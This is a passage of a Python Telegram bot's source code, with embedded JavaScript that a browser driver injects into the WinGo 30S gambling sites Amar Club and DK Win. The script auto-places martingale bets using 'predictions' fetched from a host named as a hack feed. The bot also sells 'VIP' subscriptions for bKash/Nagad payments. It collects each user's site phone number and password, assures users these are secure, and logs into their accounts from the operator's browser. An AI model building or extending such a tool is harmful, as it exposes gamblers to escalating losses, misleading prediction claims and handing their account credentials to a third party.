                chars[i]=String.fromCharCode(chars[i].charCodeAt(0)+1);
                return chars.join('');
            }
            chars[i]='0';
        }
        return '1'+chars.join('');
    };

    const apiLoopTask=async()=>{
        if(!st.isRun||st.isTrd||isFetchingApi)return;
        isFetchingApi=true;
        try{
            chkBal();
            const uBal=document.getElementById('ui-bal'),uSts=document.getElementById('ui-sts'),uBet=document.getElementById('ui-bet');
            if(st.curBal>=st.tgtAmt&&st.curBal>0){
                uBal.innerText=uF(st.curBal.toFixed(2) + ' (DONE)');
                uSts.innerText=uF('DONE');
                uSts.className='txt-blk-accent';
                stpBtn.style.display='none';
                VoiceEngine.speak("Target reached successfully.");
                st.isRun=false;
                clearInterval(st.autoInt);
                lkOvl.style.display='none';
                document.body.style.overflow='';
                return;
            }else{
                uBal.innerText=uF(st.curBal>0?st.curBal.toFixed(2):'--');
            }

            let ts=Math.floor(Date.now()/1000),res=await fetch("https://data-vip-247-hack.ai.studio/apipid.json?ts="+ts),dataArray=await res.json();
            if(dataArray&&dataArray.length>0){
                if(curApiIdx>=dataArray.length)curApiIdx=0;
                let activeLogic=dataArray[curApiIdx],tempHist=activeLogic.history,cSig=getNextLivePeriod(String(tempHist[0].pid)),sSig=sessionStorage.getItem('drx_sig');
                if(cSig!==sSig){
                    if(st.lastPred&&st.lastPeriod){
                        let actualData=tempHist[0],actualR=actualData.actual==='BIG'?'BIG':'SMALL';
                        if(st.lastPred===actualR){
                            st.w++;
                            st.stpIdx=0;
                            st.cur_w_streak++;
                            st.cur_l_streak=0;
                            if(st.cur_w_streak>st.max_w_streak) st.max_w_streak=st.cur_w_streak;
                        }else{
                            st.l++;
                            st.stpIdx=Math.min(st.stpIdx+1,st.dynSeq.length-1);
                            curApiIdx=(curApiIdx===0&&dataArray.length>1)?1:0;
                            st.cur_l_streak++;
                            st.cur_w_streak=0;
                            if(st.cur_l_streak>st.max_l_streak) st.max_l_streak=st.cur_l_streak;
                        }
                    }
                    st.lastPeriod=cSig;
                    let timeLeft=dTimeLeft;
                    if(timeLeft<=cfg.minSf){
                        uSts.innerText=uF('<10S');
                        uSts.className='txt-blk-warn';
                    }
                    st.isTrd=true;
                    uSts.innerText=uF('CHK...');
                    uSts.className='txt-blk-warn';
                    let nBal=chkBal();
                    uBal.innerText=uF(nBal.toFixed(2));
                    if(nBal>=st.tgtAmt&&nBal>0){
                        st.isTrd=false;
                        isFetchingApi=false;
                        return;
                    }
                    if(st.stpIdx>=st.dynSeq.length)st.stpIdx=st.dynSeq.length-1;
                    let tAmt=st.manualOverrideBet?st.manualOverrideBet:st.dynSeq[st.stpIdx];
                    uBet.innerText=uF(st.manualOverrideBet?tAmt+' (FIX)':(tAmt + ' (S' + (st.stpIdx+1) + ')'));
                    if(nBal<tAmt){
                        uSts.innerText=uF('LOW');
                        uSts.className='txt-blk-err';
                        st.stpIdx=0;
                        st.isTrd=false;
                        isFetchingApi=false;
                        return;
                    }
                    uSts.innerText=uF('DB...');
                    uSts.className='txt-blk-cyan';
                    setTimeout(()=>{
                        let activeLogicNew=dataArray[curApiIdx],prediction=(activeLogicNew.pred||'BIG').toUpperCase();
                        st.lastPred=prediction;
                        let ghC=document.getElementById('gh-content');
                        if(ghC)ghC.textContent='Step: ' + (st.stpIdx+1) + '/' + st.dynSeq.length + ' (Amt: ' + tAmt + ')\\nPred: ' + prediction + ' | W:' + st.w + ' L:' + st.l;
                        if(prediction==='SKIP'){
                            uSts.innerText=uF('SKIP');
                            uSts.className='txt-blk-warn';
                            sessionStorage.setItem('drx_sig',cSig);
                            setTimeout(()=>{st.isTrd=false;},1000);
                        }else{
                            uSts.innerText=uF('EXC...');
                            uSts.className='txt-blk';
                            exeTrd(prediction,tAmt,(suc)=>{
                                if(suc){
                                    uSts.innerText=uF('OK');
                                    uSts.className='txt-blk-accent';
                                    sessionStorage.setItem('drx_sig',cSig);
                                    sessionStorage.setItem('drx_p_bal',st.curBal);
                                    st.tradesDone++;
                                }else{
                                    uSts.innerText=uF('ERR');
                                    uSts.className='txt-blk-err';
                                }
                                setTimeout(()=>{st.isTrd=false;},1000);
                            });
                        }
                    },1800);
                }else if(!st.isTrd){
                    uSts.innerText=uF('SCAN');
                    uSts.className='txt-blk';
                }
            }
        }catch(e){
            st.isTrd=false;
        }
        isFetchingApi=false;
    };

    goBtn.onclick=()=>{
        let inputTarget=parseFloat(tgtInp.value);
        if(!inputTarget||inputTarget<=0){
            alert('Please enter Target Profit Amount!');
            tgtInp.focus();
            return;
        }
        let inputSteps=parseInt(stepInp.value)||1;
        if(inputSteps<=0)inputSteps=1;
        st.totalSteps=inputSteps;
        clearInterval(st.preScn);
        st.tradesDone=0;
        st.w=0;
        st.l=0;
        curApiIdx=0;
        let liveB=chkBal();
        st.startBal=liveB;
        st.tgtAmt=(inputTarget<=liveB)?(liveB+inputTarget):inputTarget;
        st.dynSeq=generateSmartSequence(liveB,st.totalSteps);
        st.stpIdx=0;
        VoiceEngine.speak("Engine started with smart step calculation.");
        scnUI(()=>{
            sessionStorage.removeItem('drx_sig');
            sessionStorage.removeItem('drx_p_bal');
            document.getElementById('ui-tgt').innerText=uF(st.tgtAmt.toFixed(0));
            p1.style.display='none';
            p2.style.display='block';
            lkOvl.style.display='block';
            document.body.style.overflow='hidden';
            st.isRun=true;
            st.isTrd=false;
            document.getElementById('ui-sts').innerText=uF('RDY');
            st.autoInt=setInterval(apiLoopTask,1000);
        });
    };

    stpBtn.onclick=()=>{
        st.isRun=false;
        clearInterval(st.autoInt);
        sessionStorage.removeItem('drx_sig');
        sessionStorage.removeItem('drx_p_bal');
        document.getElementById('ui-sts').innerText=uF('HLT');
        document.getElementById('ui-sts').className='txt-blk-err';
        lkOvl.style.display='none';
        document.body.style.overflow='';
        p2.style.display='none';
        p1.style.display='block';
    };

    if (autoTargetProfit && autoTotalSteps) {
        setTimeout(() => {
            goBtn.click();
        }, 1200);
    }

    return "INJECTED_SUCCESSFULLY";
})();
"""

# ==========================================
# 8. Interactive Multilingual Keyboards
# ==========================================
def get_channel_lock_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Channel 1: DARK 67 HACK", url=CHANNEL_1),
        InlineKeyboardButton("📢 Channel 2: BD WIN 24", url=CHANNEL_2),
        InlineKeyboardButton(f"✅ {to_bold('I HAVE JOINED / এগিয়ে যান')}", callback_data="channel_joined_continue")
    )
    return markup

def get_language_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🇧🇩 বাংলা (Bangla)", callback_data="set_lang:bn"),
        InlineKeyboardButton("🇬🇧 English", callback_data="set_lang:en")
    )
    return markup

def get_pricing_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    buttons = [
        InlineKeyboardButton(f"💎 {to_bold(p['label'])}", callback_data=f"buy_plan:{k}")
        for k, p in PRICING_PLANS.items()
    ]
    # Add in pairs of 2
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            markup.row(buttons[i], buttons[i+1])
        else:
            markup.row(buttons[i])
    return markup

def get_payment_methods_keyboard(plan_key):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔴 bKash (বিকাশ)", callback_data=f"pay_meth:{plan_key}:bkash"),
        InlineKeyboardButton("🟠 Nagad (নগদ)", callback_data=f"pay_meth:{plan_key}:nagad")
    )
    markup.add(InlineKeyboardButton(f"⬅️ {to_bold('BACK / পরিবর্তন')}", callback_data="show_plans"))
    return markup

def get_site_choice_keyboard(chat_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"🟢 {to_bold('AMAR CLUB')}", callback_data="site_amarclub"),
        InlineKeyboardButton(f"🔵 {to_bold('DK WIN')}", callback_data="site_dkwin")
    )
    return markup

def get_credentials_keyboard(sid):
    sess = active_sessions.get(sid, {})
    markup = InlineKeyboardMarkup(row_width=2)
    has_phone = bool(sess.get("phone"))

    if not has_phone:
        markup.add(
            InlineKeyboardButton(f"📱 {to_bold('ENTER NUMBER')}", callback_data=f"ask_num:{sid}"),
            InlineKeyboardButton(f"🔑 {to_bold('PASSWORD')}", callback_data=f"ask_pass:{sid}")
        )
    else:
        markup.add(
            InlineKeyboardButton(f"🔑 {to_bold('ENTER PASSWORD')}", callback_data=f"ask_pass:{sid}")
        )
    markup.add(InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}"))
    return markup

def get_start_screen_keyboard(sid):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"🚀 {to_bold('START CONFIG')}", callback_data=f"start_cfg:{sid}"),
        InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
    )
    return markup

def get_setup_param_keyboard(sid):
    sess = active_sessions.get(sid, {})
    t_val = sess.get("target_profit", 0)
    s_val = sess.get("total_steps", 7)

    t_lbl = f"TARGET: {int(t_val)}৳" if t_val else "SET TARGET"
    s_lbl = f"STEPS: {int(s_val)}" if s_val else "SET STEPS"

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"🎯 {to_bold(t_lbl)}", callback_data=f"set_tgt:{sid}"),
        InlineKeyboardButton(f"⚡ {to_bold(s_lbl)}", callback_data=f"set_stp:{sid}")
    )
    markup.add(
        InlineKeyboardButton(f"▶️ {to_bold('RUN ENGINE')}", callback_data=f"run_auto:{sid}"),
        InlineKeyboardButton(f"❌ {to_bold('CANCEL')}", callback_data=f"cancel:{sid}")
    )
    return markup

def get_trading_control_keyboard(sid):
    sess = active_sessions.get(sid, {})
    sess["anim_tick"] = sess.get("anim_tick", 0) + 1
    spinner = SPINNER_FRAMES[sess["anim_tick"] % len(SPINNER_FRAMES)]

    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(f"📸 {to_bold('SHOT')}", callback_data=f"shot:{sid}"),
        InlineKeyboardButton(f"💰 {to_bold('BAL')}", callback_data=f"bal:{sid}")
    )
    markup.add(
        InlineKeyboardButton(f"📊 {to_bold('STATS')}", callback_data=f"stats:{sid}"),
        InlineKeyboardButton(f"⏹ {to_bold(f'STOP {spinner}')}", callback_data=f"stop:{sid}")
    )
    return markup

# ==========================================
# 9. Bot Command & Conversation Logic
# ==========================================
@bot.message_handler(commands=['start'])
def handle_start(message):
    chat_id = message.chat.id
    safe_delete_message(chat_id, message.message_id)

    user_states[chat_id] = {"stage": "INIT"}

    welcome_lock_text = (
        f"<b>{to_bold('ASSALAMU ALAIKUM / WELCOME')}</b> 🌟\n\n"
        f"আমাদের ভিআইপি উইনগো ৩০এস অটোমেশন বোট-এ আপনাকে স্বাগতম!\n\n"
        f"<b>দয়া করে নিচের দুটি অফিশিয়াল চ্যানেলে জয়েন করুন:</b>\n"
        f"1. DARK 67 HACK\n"
        f"2. BD WIN 24\n\n"
        f"<i>চ্যানেলে জয়েন করে নিচের 'I HAVE JOINED' বাটনে ক্লিক করে এগিয়ে যান।</i>"
    )

    bot.send_message(
        chat_id,
        welcome_lock_text,
        reply_markup=get_channel_lock_keyboard(),
        disable_web_page_preview=True
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback_router(call):
    chat_id = call.message.chat.id
    data = call.data

    # 1. Channel Lock passed
    if data == "channel_joined_continue":
        bot.answer_callback_query(call.id)
        msg_text = (
            f"<b>{to_bold('SELECT LANGUAGE / ভাষা নির্বাচন করুন')}</b>\n\n"
            f"দয়া করে আপনার সুবিধাজনক ভাষা নির্বাচন করুন:"
        )
        bot.edit_message_text(
            msg_text,
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_language_keyboard()
        )

    # 2. Language Selected
    elif data.startswith("set_lang:"):
        lang = data.split(":")[1]
        user_states.setdefault(chat_id, {})["lang"] = lang
        bot.answer_callback_query(call.id)

        # Check subscription status
        has_sub, rem_days = is_user_subscribed(chat_id)
        if has_sub:
            # Already active subscriber
            msg = (
                f"<b>{to_bold('VIP ACCESS ACTIVE')}</b>\n\n"
                f"স্বাগতম প্রিয় গ্রাহক! আপনার সাবস্ক্রিপশন মেয়াদ এখনও <b>{rem_days} দিন</b> বাকি রয়েছে।\n"
                f"নিচের তালিকা থেকে সাইট সিলেক্ট করে অটোমেশন চালু করুন:"
            )
            bot.edit_message_text(
                msg,
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=get_site_choice_keyboard(chat_id)
            )
        else:
            # Show Pricing List
            pricing_text = (
                f"<b>{to_bold('VIP SUBSCRIPTION PLANS')}</b> 💎\n\n"
                f"আমাদের প্রিমিয়াম WinGo 30S হাই-টেক অটোমেশন নিতে নিচের যেকোনো একটি প্যাকেজ বেছে নিন:\n\n"
                f"• <b>1 Day:</b> 500 BDT\n"
                f"• <b>3 Days:</b> 1,300 BDT\n"
                f"• <b>6 Days:</b> 2,400 BDT\n"
                f"• <b>7 Days:</b> 2,700 BDT\n"
                f"• <b>10 Days:</b> 3,500 BDT\n"
                f"• <b>1 Month (30 Days):</b> 9,000 BDT\n\n"
                f"<i>নিচের বাটনে ক্লিক করে প্যাকেজটি নির্বাচন করুন:</i>"
            )
            bot.edit_message_text(
                pricing_text,
                chat_id=chat_id,
                message_id=call.message.message_id,
                reply_markup=get_pricing_keyboard()
            )

    # 3. Show Pricing Plans
    elif data == "show_plans":
        bot.answer_callback_query(call.id)
        pricing_text = (
            f"<b>{to_bold('VIP SUBSCRIPTION PLANS')}</b> 💎\n\n"
            f"নিচের যেকোনো একটি প্যাকেজ বেছে নিন:"
        )
        bot.edit_message_text(
            pricing_text,
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_pricing_keyboard()
        )

    # 4. Plan Selected -> Ask Payment Method
    elif data.startswith("buy_plan:"):
        plan_key = data.split(":")[1]
        plan_info = PRICING_PLANS.get(plan_key)
        if not plan_info:
            return
        user_states.setdefault(chat_id, {})["selected_plan"] = plan_key
        bot.answer_callback_query(call.id)

        prompt_msg = (
            f"<b>{to_bold('PAYMENT METHOD SELECTION')}</b>\n\n"
            f"নির্বাচিত প্যাকেজ: <b>{plan_info['name']}</b>\n"
            f"মোট প্রদেয় অর্থ: <b>{plan_info['price']} BDT</b>\n\n"
            f"আশা করি আপনার লেনদেনটি সফল হোক।\n"
            f"দয়া করে আমাদের নাম্বারে সেন্ড মানি করুন।\n"
            f"নিচের বাটন থেকে পেমেন্ট মেথডটি সিলেক্ট করুন:"
        )
        bot.edit_message_text(
            prompt_msg,
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_payment_methods_keyboard(plan_key)
        )

    # 5. Method Selected -> Show Number & Ask TrxID
    elif data.startswith("pay_meth:"):
        _, plan_key, method = data.split(":")
        plan_info = PRICING_PLANS.get(plan_key)
        phone_num = BKASH_NUMBER if method == "bkash" else NAGAD_NUMBER
        meth_name = "bKash (বিকাশ)" if method == "bkash" else "Nagad (নগদ)"

        user_states[chat_id]["pending_payment"] = {
            "plan_key": plan_key,
            "method": method,
            "price": plan_info["price"],
            "days": plan_info["days"]
        }
        user_states[chat_id]["stage"] = "WAITING_TRXID"

        bot.answer_callback_query(call.id)
        pay_instr = (
            f"<b>{to_bold('SEND MONEY & SUBMIT TRXID')}</b>\n\n"
            f"আসসালামু আলাইকুম। আপনার লেনদেনটি সফল হোক এটাই আমাদের কামনা।\n\n"
            f"পেমেন্ট মেথড: <b>{meth_name}</b>\n"
            f"নাম্বার: <code>{phone_num}</code>\n"
            f"টাকার পরিমাণ: <b>{plan_info['price']} BDT</b>\n\n"
            f"<b>নির্দেশনা:</b>\n"
            f"১. উপরের নাম্বারে <b>Send Money</b> করুন।\n"
            f"২. সেন্ড মানি করে আপনাদের ট্রানজেকশন আইডিটি (TrxID) নিচে লিখে চ্যাটে সেন্ড করুন। আর কিছু করার দরকার নেই।"
        )
        bot.edit_message_text(
            pay_instr,
            chat_id=chat_id,
            message_id=call.message.message_id
        )

    # 6. Owner Approval / Rejection Handling
    elif data.startswith("admin_approve:") or data.startswith("admin_reject:"):
        if call.from_user.id != OWNER_CHAT_ID:
            bot.answer_callback_query(call.id, "আপনি এই অ্যাকশনের জন্য অনুমতিপ্রাপ্ত নন!", show_alert=True)
            return

        is_approve = data.startswith("admin_approve:")
        target_chat_id = int(data.split(":")[1])

        db = load_db()
        pending = db.get("pending_requests", {}).pop(str(target_chat_id), None)

        if not pending:
            bot.answer_callback_query(call.id, "এই অনুরোধটি ইতোমধ্যেই প্রসেস করা হয়েছে।", show_alert=True)
            return

        if is_approve:
            days = pending.get("days", 1)
            expires_at = time.time() + (days * 86400)
            db.setdefault("subscribers", {})[str(target_chat_id)] = {
                "plan_key": pending.get("plan_key"),
                "days": days,
                "approved_at": time.time(),
                "expires_at": expires_at
            }
            save_db(db)

            bot.answer_callback_query(call.id, "অনুমোদন সফল হয়েছে!")
            bot.edit_message_text(
                f"✅ <b>অনুমোদিত!</b> ইউজার <code>{target_chat_id}</code> এর সাবস্ক্রিপশন চালু করা হয়েছে।",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )

            # Notify user
            success_msg = (
                f"<b>{to_bold('PAYMENT APPROVED SUCCESSFULLY')}</b> ✅\n\n"
                f"আসসালামু আলাইকুম। প্রিয় গ্রাহক আপনার লেনদেনটি সফল হয়েছে।\n"
                f"আপনি ফাইলটি নিতে পারবেন এবং বোটটি সম্পূর্ণ ফ্রিলি ইউজ করতে পারবেন।\n\n"
                f"মেয়াদ: <b>{days} দিন</b>\n\n"
                f"<i>নিচের বাটন থেকে আপনার প্ল্যাটফর্ম নির্বাচন করে কাজ শুরু করুন:</i>"
            )
            bot.send_message(
                target_chat_id,
                success_msg,
                reply_markup=get_site_choice_keyboard(target_chat_id)
            )
        else:
            save_db(db)
            bot.answer_callback_query(call.id, "অনুরোধটি বাতিল করা হয়েছে।")
            bot.edit_message_text(
                f"❌ <b>বাতিল!</b> ইউজার <code>{target_chat_id}</code> এর অনুরোধ বাতিল করা হয়েছে।",
                chat_id=call.message.chat.id,
                message_id=call.message.message_id
            )
            rejection_msg = (
                f"<b>{to_bold('TRANSACTION REJECTED')}</b> ❌\n\n"
                f"দুঃখিত, আপনার ট্রানজেকশন তথ্যটি যাচাই করা সম্ভব হয়নি অথবা বাতিল করা হয়েছে।\n"
                f"প্রয়োজনে সঠিক TrxID দিয়ে পুনরায় চেষ্টা করুন অথবা অ্যাডমিনের সাথে যোগাযোগ করুন।"
            )
            bot.send_message(target_chat_id, rejection_msg)

    # 7. Platform Selected (AmarClub / DKWin)
    elif data in ["site_amarclub", "site_dkwin"]:
        site_name = "Amar Club" if data == "site_amarclub" else "DK Win"
        sid = f"{chat_id}_{int(time.time()) % 1000000}"

        active_sessions[sid] = {
            "chat_id": chat_id,
            "session_id": sid,
            "site_name": site_name,
            "phone": None,
            "password": None,
            "target_profit": 0,
            "total_steps": 7,
            "is_trading": False,
            "created_at": time.time(),
            "anim_tick": 0,
            "lock": threading.RLock()
        }

        user_states[chat_id]["active_sid"] = sid
        bot.answer_callback_query(call.id)

        card_text = (
            f"<b>{to_bold('ACCOUNT LOGIN')}</b>\n\n"
            f"প্ল্যাটফর্ম: <b>{site_name}</b>\n\n"
            f"আসসালামু আলাইকুম, দয়া করে নিচের বাটন চেপে আপনার নাম্বার এবং পাসওয়ার্ড দিন। "
            f"এটি সম্পূর্ণ সুরক্ষিত থাকবে এবং কাজ শেষে চ্যাট থেকে স্বয়ংক্রিয়ভাবে মুছে যাবে।"
        )
        bot.edit_message_text(
            card_text,
            chat_id=chat_id,
            message_id=call.message.message_id,
            reply_markup=get_credentials_keyboard(sid)
        )
        active_sessions[sid]["cred_card_msg_id"] = call.message.message_id

    # 8. Credentials Entry Prompts
    elif data.startswith("ask_num:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            active_sessions[sid]["input_mode"] = "WAITING_PHONE"
            user_states[chat_id]["active_sid"] = sid
            bot.answer_callback_query(call.id)
            prompt_m = bot.send_message(chat_id, f"<b>{to_bold('ACCOUNT NUMBER')}</b>\n\nআপনার একাউন্ট ফোন নাম্বার লিখে পাঠান:")
            active_sessions[sid]["temp_prompt_id"] = prompt_m.message_id

    elif data.startswith("ask_pass:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            if not active_sessions[sid].get("phone"):
                bot.answer_callback_query(call.id, "আগে ফোন নাম্বারটি দিন!", show_alert=True)
                return
            active_sessions[sid]["input_mode"] = "WAITING_PASS"
            user_states[chat_id]["active_sid"] = sid
            bot.answer_callback_query(call.id)
            prompt_m = bot.send_message(chat_id, f"<b>{to_bold('ACCOUNT PASSWORD')}</b>\n\nআপনার একাউন্টের পাসওয়ার্ড লিখে পাঠান:")
            active_sessions[sid]["temp_prompt_id"] = prompt_m.message_id

    # 9. Start Config Screen
    elif data.startswith("start_cfg:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            bot.answer_callback_query(call.id, "উইনগো ৩০এস মার্কেট লোড হচ্ছে...")
            threading.Thread(target=prepare_wingo_parameters, args=(chat_id, sid), daemon=True).start()

    # 10. Set Target
    elif data.startswith("set_tgt:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            active_sessions[sid]["input_mode"] = "WAITING_TARGET"
            user_states[chat_id]["active_sid"] = sid
            bot.answer_callback_query(call.id)
            cur_bal = active_sessions[sid].get("current_balance", 0.0)
            p_msg = bot.send_message(chat_id, f"<b>{to_bold('TARGET PROFIT')}</b>\n\nবর্তমান ব্যালেন্স: <code>৳ {cur_bal:.2f}</code>\nটার্গেট প্রফিট পরিমাণ লিখুন (যেমন: 500):")
            active_sessions[sid]["temp_prompt_id"] = p_msg.message_id

    # 11. Set Steps
    elif data.startswith("set_stp:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            active_sessions[sid]["input_mode"] = "WAITING_STEPS"
            user_states[chat_id]["active_sid"] = sid
            bot.answer_callback_query(call.id)
            tgt = active_sessions[sid].get("target_profit", 0)
            p_msg = bot.send_message(chat_id, f"<b>{to_bold('MARTINGALE STEPS')}</b>\n\nমার্টিনগেল ব্যাকআপ স্টেপ সংখ্যা লিখুন (যেমন: 7 বা 10):")
            active_sessions[sid]["temp_prompt_id"] = p_msg.message_id

    # 12. Run Engine
    elif data.startswith("run_auto:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            sess = active_sessions[sid]
            if not sess.get("target_profit") or sess["target_profit"] <= 0:
                bot.answer_callback_query(call.id, "আগে টার্গেট অ্যামাউন্ট লিখুন!", show_alert=True)
                return

            bot.answer_callback_query(call.id, "ট্রেডিং ইঞ্জিন সক্রিয় করা হচ্ছে...")
            sess["is_trading"] = True

            def _run_core(drv):
                drv.execute_script(WINGO_CORE_JS, sess["target_profit"], sess["total_steps"])
            safe_tab_execute(sid, _run_core)

            time.sleep(2.0)

            start_snap = os.path.join(PROFILES_BASE_DIR, f"run_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(start_snap)
            safe_tab_execute(sid, _shot)

            cur_b = sess.get("current_balance", 0.0)
            target_total = cur_b + sess["target_profit"]
            sess["start_bal"] = cur_b

            dashboard_caption = (
                f"<b>{to_bold('24/7 AUTOMATION ENGINE ACTIVE')}</b>\n\n"
                f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                f"Starting Balance: <code>৳ {cur_b:.2f}</code>\n"
                f"Target Balance: <code>৳ {target_total:.2f}</code>\n"
                f"Total Steps: <b>{sess['total_steps']}</b>\n\n"
                f"Trading automatically in background 24/7.\n"
                f"<b>LIVE STATUS</b>: মার্টিনগেল ইঞ্জিন সফলভাবে সচল রয়েছে।"
            )

            display_or_replace_photo(chat_id, sid, start_snap, dashboard_caption, get_trading_control_keyboard(sid))
            try:
                if os.path.exists(start_snap):
                    os.remove(start_snap)
            except Exception:
                pass

            threading.Thread(target=monitor_trading_progress, args=(chat_id, sid), daemon=True).start()

    # 13. Shot
    elif data.startswith("shot:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            sess = active_sessions[sid]
            bot.answer_callback_query(call.id, "লাইভ ফুটেজ আপডেট হচ্ছে...")
            temp_shot = os.path.join(PROFILES_BASE_DIR, f"live_{sid}.png")
            def _shot(drv):
                drv.save_screenshot(temp_shot)
            safe_tab_execute(sid, _shot)

            if os.path.exists(temp_shot):
                t_total = sess.get("start_bal", 0.0) + sess.get("target_profit", 0.0)
                caption = (
                    f"<b>{to_bold('LIVE FOOTAGE SNAPSHOT')}</b>\n\n"
                    f"Platform: <b>{sess.get('site_name', '')}</b>\n"
                    f"Starting Balance: <code>৳ {sess.get('start_bal', 0.0):.2f}</code>\n"
                    f"Target Balance: <code>৳ {t_total:.2f}</code>\n"
                    f"Total Steps: <b>{sess.get('total_steps', 7)}</b>\n\n"
                    f"টাইমস্ট্যাম্প: <code>{time.strftime('%H:%M:%S')}</code>\n"
                    f"<b>LIVE STATUS</b>: ইঞ্জিন সক্রিয় রয়েছে।"
                )
                display_or_replace_photo(chat_id, sid, temp_shot, caption, get_trading_control_keyboard(sid))
                try:
                    os.remove(temp_shot)
                except Exception:
                    pass

    # 14. Bal
    elif data.startswith("bal:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            def _bal(drv):
                return drv.execute_script(FETCH_BALANCE_JS)
            b = safe_tab_execute(sid, _bal)
            if b is not None:
                bot.answer_callback_query(call.id, f"লাইভ ব্যালেন্স: ৳ {b:.2f}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "ব্যালেন্স লোড হচ্ছে...", show_alert=True)

    # 15. Stats
    elif data.startswith("stats:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            def _stat(drv):
                return drv.execute_script("""
                    if (window.__WINGO_ST) {
                        return {
                            w: window.__WINGO_ST.w || 0,
                            l: window.__WINGO_ST.l || 0,
                            step: (window.__WINGO_ST.stpIdx || 0) + 1,
                            maxStep: (window.__WINGO_ST.dynSeq || []).length,
                            curBal: window.__WINGO_ST.curBal || 0,
                            tgtAmt: window.__WINGO_ST.tgtAmt || 0
                        };
                    }
                    return null;
                """)
            data_rep = safe_tab_execute(sid, _stat)
            if data_rep:
                stat_txt = (
                    f"<b>{to_bold('LIVE STATS REPORT')}</b>\n\n"
                    f"ব্যালেন্স: <code>৳ {data_rep['curBal']:.2f}</code>\n"
                    f"টার্গেট: <code>৳ {data_rep['tgtAmt']:.2f}</code>\n"
                    f"মার্টিনগেল লেভেল: <b>Step {data_rep['step']}/{data_rep['maxStep']}</b>\n"
                    f"উইন: <b>{data_rep['w']}</b> | লস: <b>{data_rep['l']}</b>"
                )
                bot.send_message(chat_id, stat_txt)
            else:
                bot.answer_callback_query(call.id, "ইঞ্জিন লোড হচ্ছে...", show_alert=True)

    # 16. Stop
    elif data.startswith("stop:"):
        sid = data.split(":")[1]
        if sid in active_sessions:
            sess = active_sessions[sid]
            def _stop(drv):
                drv.execute_script("let btn = document.querySelector('#sys-core-fin button'); if(btn) btn.click();")
            safe_tab_execute(sid, _stop)
            sess["is_trading"] = False
            bot.answer_callback_query(call.id, "ট্রেডিং সাময়িক স্থগিত করা হয়েছে", show_alert=True)
            bot.send_message(chat_id, f"<b>{to_bold('TRADING PAUSED')}</b>\nট্রেডিং অটোমেশন সাময়িকভাবে থামানো হয়েছে।")

    # 17. Cancel
    elif data.startswith("cancel:"):
        sid = data.split(":")[1] if ":" in data else None
        if sid and sid in active_sessions:
            close_session_tab(sid)
        safe_delete_message(chat_id, call.message.message_id)
        bot.answer_callback_query(call.id, "সেশন বাতিল করা হয়েছে")
        bot.send_message(chat_id, f"<b>{to_bold('SESSION TERMINATED')}</b>\nসেশনটি বন্ধ করা হয়েছে। পুনরায় শুরু করতে /start পাঠান।")

# ==========================================
# 10. Text Input Handler & Auto Forwarding
# ==========================================
@bot.message_handler(func=lambda msg: True)
def handle_text_inputs(message):
    chat_id = message.chat.id
    text = message.text.strip()
    safe_delete_message(chat_id, message.message_id)

    u = user_states.get(chat_id, {})

    # A. TrxID Submission
    if u.get("stage") == "WAITING_TRXID":
        pending = u.get("pending_payment")
        if not pending:
            return
        u["stage"] = "PENDING_APPROVAL"
        trx_id = text

        # Save to database
        db = load_db()
        db.setdefault("pending_requests", {})[str(chat_id)] = {
            "trx_id": trx_id,
            "plan_key": pending["plan_key"],
            "days": pending["days"],
            "price": pending["price"],
            "method": pending["method"],
            "user_id": chat_id,
            "username": message.from_user.username or "N/A",
            "full_name": message.from_user.full_name or "N/A",
            "submitted_at": time.time()
        }
        save_db(db)

        # Notify User
        bot.send_message(
            chat_id,
            f"<b>{to_bold('TRANSACTION SUBMITTED')}</b> ⏳\n\n"
            f"আপনার ট্রানজেকশন আইডি: <code>{trx_id}</code> গ্রহণ করা হয়েছে।\n"
            f"অ্যাডমিন ভেরিফাই করলেই আপনার একাউন্টে অটোমেশন সার্ভিস সক্রিয় হয়ে যাবে। দয়া করে কিছুক্ষণ অপেক্ষা করুন।"
        )

        # Send Approval Request to Owner (8707571669)
        admin_markup = InlineKeyboardMarkup(row_width=2)
        admin_markup.add(
            InlineKeyboardButton(f"✅ {to_bold('অনুমোদন (Approve)')}", callback_data=f"admin_approve:{chat_id}"),
            InlineKeyboardButton(f"❌ {to_bold('বাতিল (Cancel)')}", callback_data=f"admin_reject:{chat_id}")
        )

        owner_notif = (
            f"🔔 <b>{to_bold('NEW PAYMENT APPROVAL REQUEST')}</b>\n\n"
            f"• <b>ইউজার আইডি:</b> <code>{chat_id}</code>\n"
            f"• <b>নাম:</b> {message.from_user.full_name}\n"
            f"• <b>ইউজারনেম:</b> @{message.from_user.username or 'N/A'}\n"
            f"• <b>প্যাকেজ:</b> {pending['plan_key']} ({pending['days']} Days)\n"
